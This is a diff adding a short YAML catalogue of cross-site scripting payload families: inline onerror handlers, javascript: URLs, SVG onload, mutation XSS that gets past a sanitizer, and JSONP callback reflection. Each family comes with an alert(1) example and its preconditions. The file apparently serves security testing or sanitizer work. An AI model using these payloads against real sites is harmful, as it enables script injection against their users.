@@ -1,0 +1,31 @@
+families:
+  - id: xss-attr-onerror-basic
+    category: html-attribute
+    tags: [inline-event-handlers]
+    preconditions: { allows_event_handlers: true }
+    examples: ["<img src=x onerror=alert(1)>"]
+    why_it_works: inline handler executes JS
+  - id: xss-javascript-url
+    category: url
+    tags: [javascript-protocol]
+    preconditions: { protocol_whitelist: permissive }
+    examples: ["javascript:alert(1)"]
+    why_it_works: javascript: executes
+  - id: xss-svg-onload
+    category: svg
+    tags: [svg-scripting]
+    preconditions: { svg_scripting_allowed: true }
+    examples: ["<svg onload=alert(1)>"]
+    why_it_works: svg can execute
+  - id: xss-mxss-nested
+    category: mutation-xss
+    tags: [mXSS]
+    preconditions: { sanitizer: present_but_bypassable }
+    examples: ["<math><table><img src=x onerror=alert(1)>"]
+    why_it_works: mutation enables exec
+  - id: xss-json-in-script-callback
+    category: jsonp
+    tags: [jsonp]
+    preconditions: { script_includes_json: true, callback_reflection: true }
+    examples: ["/api?callback=alert%281%29"]
+    why_it_works: JSONP executes callbacks
